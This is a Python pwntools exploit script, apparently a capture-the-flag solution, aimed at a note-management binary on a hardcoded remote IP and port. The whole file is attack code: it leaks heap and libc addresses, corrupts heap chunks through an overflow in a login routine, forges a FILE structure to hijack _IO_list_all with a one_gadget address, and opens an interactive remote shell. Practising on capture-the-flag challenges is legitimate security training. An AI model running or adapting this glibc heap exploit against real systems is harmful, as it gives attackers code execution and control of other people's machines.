# coding:utf-8
#!/usr/bin/env python2
import copy
from ctypes import *
from pwn import *

#p = process('./test',env={"LD_PRELOAD":"/lib/x86_64-linux-gnu/libc.so.6"})
elf = ELF('./test')
p=remote('116.62.142.216', 20002)
#p = remote('116.62.152.176',20001)
#context.log_level = 'debug'
#libc = ELF("./libc.so.6")
#libc = ELF("./libc-2.24.so")
e = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def create(size,note):
    p.recvuntil('4.exit\n')
    p.sendline('1')
    p.recvuntil('Pls Input your note size\n')
    p.sendline(str(size))
    p.recvuntil('Input your note\n')
    p.sendline(note)
 
def delete(id):
    p.recvuntil('4.exit\n')
    p.sendline('2')
    p.recvuntil('Input id:\n')
    p.sendline(str(id))

def login(name,mytype):
    p.recvuntil('4.exit\n')
    p.sendline('3')
    p.recvuntil('Please input your name\n')
    p.sendline(name)
    p.recvuntil('1.admin\n')
    p.sendline(str(mytype))

def z(a=''):
    gdb.attach(p,a)
    if a == '':
        raw_input()

free_got = elf.got['free']
printf_got = elf.plt['printf']
success('free_got:'+hex(free_got))
success('printf_got:'+hex(printf_got))
success('heap_list:'+hex(0x6020E0))


#-----leak heap--------
create(0x1488,'\n')
create(0x108,'\n')

delete(0)
create(0x108,'a'*17+'\n')

p.recvuntil('your note is\n')
data = p.recvuntil('\n')[:-1]



data = data[16:]
heap = u64(data.ljust(0x8,'\x00')) - 0x61
success('heap:'+hex(heap))


#clear
create(0x1378,'\n')
delete(0)
delete(1)
delete(2)

#--------use login------


create(0x108,'\n')
create(0xe8,(p64(0x60)+p64(0x21))*0xe+'\n')
create(0x108,'\n')
create(0x108,'\n')

delete(1)
login('a'*8+p64(heap+0x118-0xf),0)

create(0x2e8,'\n')

p.recvuntil('your note is\n')
libc = u64(p.recv(6).ljust(8,'\x00'))
base = libc - 0x3C4B78

io_list_all_addr = base + e.symbols['_IO_list_all']
jump_table_addr = base + e.symbols['_IO_file_jumps'] + 0xc0

delete(1)
create(0x2e8,'a'*0xe8+p64(0x91)+p64(0x21)*30+'\n')


for i in range(5):
    create(0x1408,'\n')


delete(1)

delete(2)

file_struct=p64(0)+p64(0x61)+p64(libc)+p64(io_list_all_addr - 0x10)+p64(2)+p64(3)

file_struct = file_struct.ljust(0xd8, "\x00")
file_struct += p64(jump_table_addr)
file_struct += p64(base + 0x4526a)

create(0x2e8,'a'*0xe0+file_struct+'\n')



p.interactive()




